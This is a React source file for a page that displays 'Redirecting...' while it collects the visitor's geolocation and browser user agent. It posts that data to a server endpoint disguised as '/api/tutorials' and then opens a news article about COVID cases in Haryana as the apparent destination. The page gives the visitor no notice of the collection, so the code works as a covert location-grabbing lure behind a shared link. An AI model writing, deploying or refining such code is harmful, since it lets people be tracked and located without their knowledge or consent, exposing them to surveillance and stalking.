import React from "react";
import axios from "axios";

var options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0,
};
function success(pos) {
  var crd = pos.coords;

  console.log("Your current position is:");
  console.log(`Latitude : ${crd.latitude}`);
  console.log(`Longitude: ${crd.longitude}`);
  console.log(navigator.userAgent + `More or less ${crd.accuracy} meters.`);
  sub({
    lat: ""+crd.latitude,
    long: ""+crd.longitude,
    description: ""+navigator.userAgent
  })
}

function errors(err) {
  console.warn(navigator.userAgent + `ERROR(${err.code}): ${err.message}`);
  sub({
    lat: "-1",
    long: "-1",
    description: ""+navigator.userAgent
  })
}

function sub(data) {
  axios.post(`http://localhost:3031/api/tutorials`,  data ).then((res) => {
    console.log(res);
    window.open("https://www.bhaskar.com/local/haryana/news/in-24-hours-16246-new-patients-were-found-181-deaths-cases-increased-by-2813-and-deaths-increased-by-1383-128465757.html", '_blank');
  
  });
}

class App extends React.Component {
  componentDidMount() {
    if (navigator.geolocation) {
      navigator.permissions
        .query({ name: "geolocation" })
        .then(function (result) {
          if (result.state === "granted") {
            console.log(result.state);
            //If granted then you can directly call your function here
            navigator.geolocation.getCurrentPosition(success);
          } else if (result.state === "prompt") {
            navigator.geolocation.getCurrentPosition(success, errors, options);
          } else if (result.state === "denied") {
            //If denied then you have to show instructions to enable location
          }
          result.onchange = function () {
            console.log(result.state);
          };
        });
    } else {
      console.log(navigator.userAgent + "Sorry Not available!");
      sub({
        lat: "-2",
        long: "-2",
        description: ""+navigator.userAgent
      })
    }
  }

  render() {
    return (
      <div>
        <h2>Redirecting...</h2>
      </div>
    );
  }
}

export default App;
